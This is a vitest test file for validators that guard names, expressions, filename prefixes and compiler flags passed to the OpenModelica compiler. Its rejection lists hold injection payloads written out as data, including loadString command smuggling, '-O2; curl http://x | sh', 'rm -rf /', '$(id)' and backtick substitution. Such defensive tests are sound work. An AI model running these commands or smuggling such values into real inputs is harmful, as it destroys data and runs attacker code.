import { describe, expect, it } from "vitest";

import {
  classNameToFilePrefix,
  expressionFault,
  fileNamePrefix,
  modelicaExpr,
  modelicaName,
  resultVariable,
  shellFlags,
} from "./fields.js";

describe("the name a field is held to", () => {
  it("accepts the shapes a cref reaching OMC actually carries", () => {
    for (const s of [
      "Gain",
      "Modelica.Blocks.Math.Gain",
      "a.p",
      "pins[3].p",
      "a[1, 2].p",
      "ports[i]",
      "values[end]",
      "v[1:n]",
      "pins[i + 1]",
      "pins[2*n-1]",
      "a[b.c]",
      "'a class'.p",
      "'has.a.dot'",
      "'quoted )'",
    ]) {
      expect(modelicaName.safeParse(s).success).toBe(true);
    }
  });

  it("refuses anything that would not lex as one name", () => {
    for (const s of [
      "",
      'b.p); loadString("model X end X;"); addConnection(a.p, b.p, Demo.MSD',
      "a.p)",
      "a.p; b",
      "1a",
      "a b",
      "a.'unterminated",
      "a[1)].p",
      "a['x'].p",
      'a["x"].p',
      "a[x;y].p",
      "a[b[1]].p",
    ]) {
      expect(modelicaName.safeParse(s).success).toBe(false);
    }
  });
});

describe("the expression a field is held to", () => {
  it("accepts a self-contained expression", () => {
    for (const s of [
      "",
      "Placement(transformation(extent = {{-10, -10}, {10, 10}}))",
      'Documentation(info = "a ) is fine inside a string")',
      "{1, 2}",
      "[1, 2; 3, 4]",
      "record.'a,b'",
      "Line(points = {{0, 0}}, color = 'weird )name')",
    ]) {
      expect(expressionFault(s)).toBeUndefined();
      expect(modelicaExpr.safeParse(s).success).toBe(true);
    }
  });

  it("names why an expression would leave its argument position", () => {
    for (const [s, why] of [
      [
        'Placement()); loadString("model X end X;"); addComponent(a, B, C, annotate=Placement(',
        "closes a bracket it did not open",
      ],
      ["Line(), extraArgument", "separates arguments at the top level"],
      ["Line(", "leaves a bracket open"],
      ["Line('unterminated", "leaves a quoted identifier open"],
      [
        "'a'); loadString(\"model X end X;\"); f(",
        "closes a bracket it did not open",
      ],
      ['Line(color = "unterminated', "leaves a string literal open"],
      ["Line() // rest of the command", "comments out the rest of the command"],
    ] as const) {
      expect(expressionFault(s)).toBe(why);
      expect(modelicaExpr.safeParse(s).success).toBe(false);
    }
  });
});

describe("the variable a result field is held to", () => {
  it("accepts a derivative, which is how OMC names one in a result file", () => {
    for (const s of ["x", "body.r[1]", "der(x)", "der(body.r[1])"]) {
      expect(resultVariable.safeParse(s).success).toBe(true);
    }
  });

  it("still refuses a call that is not der", () => {
    for (const s of ["f(x)", "der(x), g(", "der(x))", "der(", "der()"]) {
      expect(resultVariable.safeParse(s).success).toBe(false);
    }
  });
});

/**
 * Names OMC accepts that a shell does not. A Q-IDENT lexes as one Modelica
 * token, so it carries anything but a quote or a backslash — which is what
 * makes a legal class name a shell word once OMC pastes it into a makefile.
 */
const HOSTILE_NAMES = [
  "Modelica.Blocks.Math.Gain",
  "'evil(name)'",
  "Pkg.'a; rm -rf x'.Model",
  "'$(id)'",
  "'a`b`'",
  "'a > out'",
  "'a\nb'",
  "'quoted )'",
  "'has.a.dot'",
  "pins[3].p",
];

describe("the prefix a generated filename is held to", () => {
  it("accepts what a filename is made of", () => {
    for (const s of [
      "Modelica_Blocks_Math_Gain",
      "model.2024-05-01",
      "_leading",
      "0",
      "<default>",
    ]) {
      expect(fileNamePrefix.safeParse(s).success).toBe(true);
    }
  });

  it("refuses a value that would not stay one shell word", () => {
    for (const s of [
      "",
      "a(b)",
      "a; rm -rf x",
      "$(id)",
      "a b",
      "../escape",
      "-flag",
      ".hidden",
      "a\nb",
      "'quoted'",
    ]) {
      expect(fileNamePrefix.safeParse(s).success).toBe(false);
    }
  });

  it("derives one from any class name a cref field would accept", () => {
    for (const name of HOSTILE_NAMES) {
      expect(modelicaName.safeParse(name).success).toBe(true);
      expect(
        fileNamePrefix.safeParse(classNameToFilePrefix(name)).success,
      ).toBe(true);
    }
  });

  it("keeps the dotted path so two leaves do not share an output directory", () => {
    expect(classNameToFilePrefix("A.Gain")).not.toBe(
      classNameToFilePrefix("B.Gain"),
    );
  });
});

describe("the flags a compiler field is held to", () => {
  it("accepts the flags a caller legitimately passes", () => {
    for (const s of [
      "",
      "<default>",
      "-O3",
      "-march=native -DNDEBUG",
      "-I/usr/include/foo -L/opt/lib",
      "-Wl,-rpath,/opt/lib",
      "-override=a=1,b=2",
      "-lv=LOG_STATS,LOG_INIT",
      "-s dassl -r out.mat",
      "-noEquidistantTimeGrid",
    ]) {
      expect(shellFlags.safeParse(s).success).toBe(true);
    }
  });

  it("refuses a value that would run a command of its own", () => {
    for (const s of [
      "-O2; curl http://x | sh",
      "-O2 && rm -rf /",
      "-O2 `id`",
      "-O2 $(id)",
      "-O2 $HOME",
      "-O2 > /etc/passwd",
      "-O2\nrm -rf /",
      "-O2 # rest",
      '-DV="1.0"',
      "-O2 | tee x",
    ]) {
      expect(shellFlags.safeParse(s).success).toBe(false);
    }
  });
});
